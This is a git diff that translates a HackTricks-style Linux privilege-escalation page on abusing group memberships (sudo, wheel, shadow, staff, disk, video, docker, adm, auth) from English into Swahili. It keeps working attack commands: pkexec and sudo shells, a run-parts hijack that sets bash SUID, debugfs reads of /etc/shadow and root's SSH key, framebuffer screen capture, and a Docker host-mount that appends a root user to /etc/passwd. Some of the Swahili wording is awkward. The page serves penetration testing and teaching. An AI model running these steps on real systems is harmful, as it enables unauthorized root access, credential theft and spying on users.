@@ -1,13 +1,12 @@
-# Interesting Groups - Linux Privesc
+# Makundi ya Kuvutia - Linux Privesc
 
 {{#include ../../../banners/hacktricks-training.md}}
 
-## Sudo/Admin Groups
+## Makundi ya Sudo/Admin
 
-### **PE - Method 1**
+### **PE - Njia 1**
 
-**Sometimes**, **by default (or because some software needs it)** inside the **/etc/sudoers** file you can find some of these lines:
-
+**Wakati mwingine**, **kwa kawaida (au kwa sababu programu fulani inahitaji hivyo)** ndani ya faili ya **/etc/sudoers** unaweza kupata baadhi ya mistari hii:
 ```bash
 # Allow members of group sudo to execute any command
 %sudo	ALL=(ALL:ALL) ALL
@@ -15,48 +14,36 @@
 # Allow members of group admin to execute any command
 %admin 	ALL=(ALL:ALL) ALL
 ```
+Hii inamaanisha kwamba **mtumiaji yeyote anaye belong kwenye kundi la sudo au admin anaweza kutekeleza chochote kama sudo**.
 
-This means that **any user that belongs to the group sudo or admin can execute anything as sudo**.
-
-If this is the case, to **become root you can just execute**:
-
+Ikiwa hii ni hali, ili **kuwa root unaweza tu kutekeleza**:
 ```
 sudo su
 ```
-
 ### PE - Method 2
 
-Find all suid binaries and check if there is the binary **Pkexec**:
-
+Pata binaries zote za suid na angalia kama kuna binary **Pkexec**:
 ```bash
 find / -perm -4000 2>/dev/null
 ```
-
-If you find that the binary **pkexec is a SUID binary** and you belong to **sudo** or **admin**, you could probably execute binaries as sudo using `pkexec`.\
-This is because typically those are the groups inside the **polkit policy**. This policy basically identifies which groups can use `pkexec`. Check it with:
-
+Ikiwa unapata kwamba **pkexec ni binary ya SUID** na unategemea **sudo** au **admin**, huenda ukawa na uwezo wa kutekeleza binaries kama sudo ukitumia `pkexec`.\
+Hii ni kwa sababu kawaida hizo ndizo vikundi ndani ya **polkit policy**. Sera hii kimsingi inatambua ni vikundi vipi vinaweza kutumia `pkexec`. Angalia kwa:
 ```bash
 cat /etc/polkit-1/localauthority.conf.d/*
 ```
+Hapo utapata ni vikundi vipi vinavyoruhusiwa kutekeleza **pkexec** na **kwa kawaida** katika baadhi ya distros za linux vikundi **sudo** na **admin** vinajitokeza.
 
-There you will find which groups are allowed to execute **pkexec** and **by default** in some linux disctros the groups **sudo** and **admin** appear.
-
-To **become root you can execute**:
-
+Ili **kuwa root unaweza kutekeleza**:
 ```bash
 pkexec "/bin/sh" #You will be prompted for your user password
 ```
-
-If you try to execute **pkexec** and you get this **error**:
-
+Ikiwa unajaribu kutekeleza **pkexec** na unapata **makosa** haya:
 ```bash
 polkit-agent-helper-1: error response to PolicyKit daemon: GDBus.Error:org.freedesktop.PolicyKit1.Error.Failed: No session for cookie
 ==== AUTHENTICATION FAILED ===
 Error executing command as another user: Not authorized
 ```
-
-**It's not because you don't have permissions but because you aren't connected without a GUI**. And there is a work around for this issue here: [https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903](https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903). You need **2 different ssh sessions**:
-
+**Sio kwa sababu huna ruhusa bali kwa sababu haujaunganishwa bila GUI**. Na kuna suluhisho kwa tatizo hili hapa: [https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903](https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903). Unahitaji **sehemu 2 tofauti za ssh**:
 ```bash:session1
 echo $$ #Step1: Get current PID
 pkexec "/bin/bash" #Step 3, execute pkexec
@@ -67,39 +54,31 @@ pkexec "/bin/bash" #Step 3, execute pkexec
 pkttyagent --process <PID of session1> #Step 2, attach pkttyagent to session1
 #Step 4, you will be asked in this session to authenticate to pkexec
 ```
-
 ## Wheel Group
 
-**Sometimes**, **by default** inside the **/etc/sudoers** file you can find this line:
-
+**Wakati mwingine**, **kwa kawaida** ndani ya **/etc/sudoers** faili unaweza kupata mstari huu:
 ```
 %wheel	ALL=(ALL:ALL) ALL
 ```
+Hii inamaanisha kwamba **mtumiaji yeyote anaye belong kwenye kundi la wheel anaweza kutekeleza chochote kama sudo**.
 
-This means that **any user that belongs to the group wheel can execute anything as sudo**.
-
-If this is the case, to **become root you can just execute**:
-
+Ikiwa hii ndiyo hali, ili **kuwa root unaweza tu kutekeleza**:
 ```
 sudo su
 ```
-
 ## Shadow Group
 
-Users from the **group shadow** can **read** the **/etc/shadow** file:
-
+Watumiaji kutoka **group shadow** wanaweza **kusoma** faili **/etc/shadow**:
 ```
 -rw-r----- 1 root shadow 1824 Apr 26 19:10 /etc/shadow
 ```
+Hivyo, soma faili na jaribu **kufungua baadhi ya hashes**.
 
-So, read the file and try to **crack some hashes**.
+## Kikundi cha Wafanyakazi
 
-## Staff Group
+**staff**: Inaruhusu watumiaji kuongeza marekebisho ya ndani kwenye mfumo (`/usr/local`) bila kuhitaji ruhusa za mzizi (zingatia kwamba executable katika `/usr/local/bin` ziko kwenye mabadiliko ya PATH ya mtumiaji yeyote, na zinaweza "kufunika" executable katika `/bin` na `/usr/bin` zenye jina sawa). Linganisha na kikundi "adm", ambacho kinahusiana zaidi na ufuatiliaji/usalama. [\[source\]](https://wiki.debian.org/SystemGroups)
 
-**staff**: Allows users to add local modifications to the system (`/usr/local`) without needing root privileges (note that executables in `/usr/local/bin` are in the PATH variable of any user, and they may "override" the executables in `/bin` and `/usr/bin` with the same name). Compare with group "adm", which is more related to monitoring/security. [\[source\]](https://wiki.debian.org/SystemGroups)
-
-In debian distributions, `$PATH` variable show that `/usr/local/` will be run as the highest priority, whether you are a privileged user or not.
-
+Katika usambazaji wa debian, mabadiliko ya `$PATH` yanaonyesha kwamba `/usr/local/` itatekelezwa kama kipaumbele cha juu zaidi, iwe wewe ni mtumiaji mwenye ruhusa au la.
 ```bash
 $ echo $PATH
 /usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
@@ -107,11 +86,9 @@ $ echo $PATH
 # echo $PATH
 /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
 ```
+Ikiwa tunaweza kuhamasisha programu fulani katika `/usr/local`, tunaweza kwa urahisi kupata root.
 
-If we can hijack some programs in `/usr/local`, we can easy to get root.
-
-Hijack `run-parts` program is a way to easy to get root, because most of program will run a `run-parts` like (crontab, when ssh login).
-
+Kuhamasisha programu ya `run-parts` ni njia rahisi ya kupata root, kwa sababu programu nyingi zitakimbia `run-parts` kama (crontab, wakati wa kuingia ssh).
 ```bash
 $ cat /etc/crontab | grep run-parts
 17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
@@ -119,9 +96,7 @@ $ cat /etc/crontab | grep run-parts
 47 6    * * 7   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.weekly; }
 52 6    1 * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.monthly; }
 ```
-
-or When a new ssh session login.
-
+au Wakati wa kuingia kwa kikao kipya cha ssh.
 ```bash
 $ pspy64
 2024/02/01 22:02:08 CMD: UID=0     PID=1      | init [2]
@@ -134,9 +109,7 @@ $ pspy64
 2024/02/01 22:02:14 CMD: UID=0     PID=17890  | sshd: mane [priv]
 2024/02/01 22:02:15 CMD: UID=0     PID=17891  | -bash
 ```
-
-**Exploit**
-
+**Kuvunja**
 ```bash
 # 0x1 Add a run-parts script in /usr/local/bin/
 $ vi /usr/local/bin/run-parts
@@ -155,13 +128,11 @@ $ ls -la /bin/bash
 # 0x5 root it
 $ /bin/bash -p
 ```
-
 ## Disk Group
 
-This privilege is almost **equivalent to root access** as you can access all the data inside of the machine.
+Hii haki ni karibu **sawa na ufikiaji wa root** kwani unaweza kufikia data zote ndani ya mashine.
 
 Files:`/dev/sd[a-z][1-9]`
-
 ```bash
 df -h #Find where "/" is mounted
 debugfs /dev/sda1
@@ -170,57 +141,47 @@ debugfs: ls
 debugfs: cat /root/.ssh/id_rsa
 debugfs: cat /etc/shadow
 ```
-
-Note that using debugfs you can also **write files**. For example to copy `/tmp/asd1.txt` to `/tmp/asd2.txt` you can do:
-
+Kumbuka kwamba kutumia debugfs unaweza pia **kuandika faili**. Kwa mfano, ili nakala ya `/tmp/asd1.txt` kwenda `/tmp/asd2.txt` unaweza kufanya:
 ```bash
 debugfs -w /dev/sda1
 debugfs:  dump /tmp/asd1.txt /tmp/asd2.txt
 ```
+Hata hivyo, ukijaribu **kuandika faili zinazomilikiwa na root** (kama `/etc/shadow` au `/etc/passwd`) utapata kosa la "**Ruhusa imekataliwa**".
 
-However, if you try to **write files owned by root** (like `/etc/shadow` or `/etc/passwd`) you will have a "**Permission denied**" error.
+## Kundi la Video
 
-## Video Group
-
-Using the command `w` you can find **who is logged on the system** and it will show an output like the following one:
-
+Kwa kutumia amri `w` unaweza kupata **nani amejiandikisha kwenye mfumo** na itakuonyesha matokeo kama ifuatavyo:
 ```bash
 USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
 yossi    tty1                      22:16    5:13m  0.05s  0.04s -bash
 moshe    pts/1    10.10.14.44      02:53   24:07   0.06s  0.06s /bin/bash
 ```
+**tty1** inamaanisha kwamba mtumiaji **yossi amejiandikisha kimwili** kwenye terminal kwenye mashine.
 
-The **tty1** means that the user **yossi is logged physically** to a terminal on the machine.
-
-The **video group** has access to view the screen output. Basically you can observe the the screens. In order to do that you need to **grab the current image on the screen** in raw data and get the resolution that the screen is using. The screen data can be saved in `/dev/fb0` and you could find the resolution of this screen on `/sys/class/graphics/fb0/virtual_size`
-
+Kikundi cha **video** kina ufikiaji wa kuangalia matokeo ya skrini. Kimsingi unaweza kuangalia skrini. Ili kufanya hivyo unahitaji **kuchukua picha ya sasa kwenye skrini** katika data safi na kupata azimio ambalo skrini inatumia. Data ya skrini inaweza kuhifadhiwa katika `/dev/fb0` na unaweza kupata azimio la skrini hii kwenye `/sys/class/graphics/fb0/virtual_size`
 ```bash
 cat /dev/fb0 > /tmp/screen.raw
 cat /sys/class/graphics/fb0/virtual_size
 ```
-
-To **open** the **raw image** you can use **GIMP**, select the \*\*`screen.raw` \*\* file and select as file type **Raw image data**:
+Ili **kufungua** **picha halisi** unaweza kutumia **GIMP**, chagua faili \*\*`screen.raw`\*\* na chagua kama aina ya faili **Data ya picha halisi**:
 
 ![](<../../../images/image (463).png>)
 
-Then modify the Width and Height to the ones used on the screen and check different Image Types (and select the one that shows better the screen):
+Kisha badilisha Upana na Kimo kuwa zile zinazotumika kwenye skrini na angalia Aina tofauti za Picha (na uchague ile inayoonyesha vizuri skrini):
 
 ![](<../../../images/image (317).png>)
 
-## Root Group
+## Kundi la Root
 
-It looks like by default **members of root group** could have access to **modify** some **service** configuration files or some **libraries** files or **other interesting things** that could be used to escalate privileges...
+Inaonekana kwamba kwa kawaida **wanachama wa kundi la root** wanaweza kuwa na ufikiaji wa **kubadilisha** baadhi ya **faili za usanidi** wa **huduma** au baadhi ya **faili za maktaba** au **mambo mengine ya kuvutia** ambayo yanaweza kutumika kuongeza mamlaka...
 
-**Check which files root members can modify**:
-
+**Angalia ni faili zipi wanachama wa root wanaweza kubadilisha**:
 ```bash
 find / -group root -perm -g=w 2>/dev/null
 ```
-
 ## Docker Group
 
-You can **mount the root filesystem of the host machine to an instance’s volume**, so when the instance starts it immediately loads a `chroot` into that volume. This effectively gives you root on the machine.
-
+Unaweza **kuunganisha mfumo wa faili wa mwenyeji kwenye kiasi cha mfano**, hivyo wakati mfano unapoanza inachukua mara moja `chroot` kwenye kiasi hicho. Hii inakupa kwa ufanisi root kwenye mashine.
 ```bash
 docker image #Get images from the docker service
 
@@ -232,33 +193,32 @@ echo 'toor:$1$.ZcF5ts0$i4k6rQYzeegUkacRCvfxC0:0:0:root:/root:/bin/sh' >> /etc/pa
 #Ifyou just want filesystem and network access you can startthe following container:
 docker run --rm -it --pid=host --net=host --privileged -v /:/mnt <imagename> chroot /mnt bashbash
 ```
-
-Finally, if you don't like any of the suggestions of before, or they aren't working for some reason (docker api firewall?) you could always try to **run a privileged container and escape from it** as explained here:
+Hatimaye, ikiwa hupendi mapendekezo yoyote ya hapo awali, au hayafanyi kazi kwa sababu fulani (docker api firewall?) unaweza kila wakati kujaribu **kufanya kazi kwenye kontena lenye mamlaka na kutoroka kutoka kwake** kama ilivyoelezwa hapa:
 
 {{#ref}}
 ../docker-security/
 {{#endref}}
 
-If you have write permissions over the docker socket read [**this post about how to escalate privileges abusing the docker socket**](../#writable-docker-socket)**.**
+Ikiwa una ruhusa za kuandika juu ya docker socket soma [**hii chapisho kuhusu jinsi ya kupandisha mamlaka kwa kutumia docker socket**](../#writable-docker-socket)**.**
 
 {% embed url="https://github.com/KrustyHack/docker-privilege-escalation" %}
 
 {% embed url="https://fosterelli.co/privilege-escalation-via-docker.html" %}
 
-## lxc/lxd Group
+## Kundi la lxc/lxd
 
 {{#ref}}
 ./
 {{#endref}}
 
-## Adm Group
+## Kundi la Adm
 
-Usually **members** of the group **`adm`** have permissions to **read log** files located inside _/var/log/_.\
-Therefore, if you have compromised a user inside this group you should definitely take a **look to the logs**.
+Kwa kawaida **wanachama** wa kundi **`adm`** wana ruhusa za **kusoma faili za log** zilizoko ndani ya _/var/log/_.\
+Hivyo, ikiwa umepata mtumiaji ndani ya kundi hili unapaswa kwa hakika kuangalia **logi**.
 
-## Auth group
+## Kundi la Auth
 
-Inside OpenBSD the **auth** group usually can write in the folders _**/etc/skey**_ and _**/var/db/yubikey**_ if they are used.\
-These permissions may be abused with the following exploit to **escalate privileges** to root: [https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot](https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot)
+Ndani ya OpenBSD kundi la **auth** kwa kawaida linaweza kuandika katika folda _**/etc/skey**_ na _**/var/db/yubikey**_ ikiwa zinatumika.\
+Ruhusa hizi zinaweza kutumika vibaya kwa kutumia exploit ifuatayo ili **kupandisha mamlaka** hadi root: [https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot](https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot)
 
 {{#include ../../../banners/hacktricks-training.md}}
